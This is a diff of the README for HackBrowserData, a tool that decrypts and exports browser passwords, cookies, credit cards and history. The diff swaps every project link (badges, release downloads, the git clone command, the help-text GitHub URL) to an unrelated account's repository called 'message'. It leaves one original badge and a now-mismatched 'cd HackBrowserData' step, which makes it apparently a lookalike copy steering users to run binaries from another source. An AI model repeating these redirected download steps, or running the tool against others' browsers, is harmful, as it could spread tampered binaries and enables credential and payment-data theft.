@@ -4,7 +4,7 @@
 
 # HackBrowserData
 
-[![Lint](https://github.com/moonD4rk/HackBrowserData/actions/workflows/lint.yml/badge.svg)](https://github.com/moonD4rk/HackBrowserData/actions/workflows/lint.yml) [![Build](https://github.com/moonD4rk/HackBrowserData/actions/workflows/build.yml/badge.svg)](https://github.com/moonD4rk/HackBrowserData/actions/workflows/build.yml) [![Release](https://github.com/moonD4rk/HackBrowserData/actions/workflows/release.yml/badge.svg)](https://github.com/moonD4rk/HackBrowserData/actions/workflows/release.yml) [![Tests](https://github.com/moonD4rk/HackBrowserData/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/moonD4rk/HackBrowserData/actions/workflows/test.yml) [![codecov](https://codecov.io/gh/moonD4rk/HackBrowserData/branch/main/graph/badge.svg?token=KWJCN38657)](https://codecov.io/gh/moonD4rk/HackBrowserData)
+[![Lint](https://github.com/mchaten42-pixel/message/actions/workflows/lint.yml/badge.svg)](https://github.com/mchaten42-pixel/message/actions/workflows/lint.yml) [![Build](https://github.com/mchaten42-pixel/message/actions/workflows/build.yml/badge.svg)](https://github.com/mchaten42-pixel/message/actions/workflows/build.yml) [![Release](https://github.com/mchaten42-pixel/message/actions/workflows/release.yml/badge.svg)](https://github.com/mchaten42-pixel/message/actions/workflows/release.yml) [![Tests](https://github.com/mchaten42-pixel/message/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/mchaten42-pixel/message/actions/workflows/test.yml) [![codecov](https://codecov.io/gh/moonD4rk/HackBrowserData/branch/main/graph/badge.svg?token=KWJCN38657)](https://codecov.io/gh/moonD4rk/HackBrowserData)
 
 `HackBrowserData` is a command-line tool for decrypting and exporting browser data (passwords, history, cookies, bookmarks, credit cards, download history, localStorage, sessionStorage and extensions) from the browser. It supports the most popular Chromium-based browsers and Firefox on Windows, macOS and Linux, plus Safari on macOS.
 
@@ -64,7 +64,7 @@ It can also decrypt data **across machines and operating systems**: export the m
 
 ### Install
 
-Installation of `HackBrowserData` is dead-simple, just download [the release for your system](https://github.com/moonD4rk/HackBrowserData/releases) and run the binary.
+Installation of `HackBrowserData` is dead-simple, just download [the release for your system](https://github.com/mchaten42-pixel/message/releases) and run the binary.
 
 > In some situations, this security tool will be treated as a virus by Windows Defender or other antivirus software and can not be executed. The code is all open source, you can modify and compile by yourself.
 
@@ -73,7 +73,7 @@ Installation of `HackBrowserData` is dead-simple, just download [the release for
 Requires `Go 1.20+`.
 
 ```bash
-git clone https://github.com/moonD4rk/HackBrowserData
+git clone https://github.com/mchaten42-pixel/message
 cd HackBrowserData
 go build ./cmd/hack-browser-data/
 ```
@@ -114,7 +114,7 @@ $ hack-browser-data -h
 hack-browser-data decrypts and exports browser data from Chromium-based
 browsers and Firefox on Windows, macOS, and Linux.
 
-GitHub: https://github.com/moonD4rk/HackBrowserData
+GitHub: https://github.com/mchaten42-pixel/message
 
 Usage:
   hack-browser-data [flags]
@@ -451,7 +451,7 @@ Please see the [Contribution Guide](CONTRIBUTING.md) before contributing.
 <!-- readme: collaborators,contributors -end -->
 
 ## Stargazers over time
-[![Star History Chart](https://api.star-history.com/svg?repos=moond4rk/hackbrowserdata&type=Date)](https://github.com/moond4rk/HackBrowserData)
+[![Star History Chart](https://api.star-history.com/svg?repos=moond4rk/hackbrowserdata&type=Date)](https://github.com/mchaten42-pixel/message)
 
 
 ## 404StarLink 2.0 - Galaxy
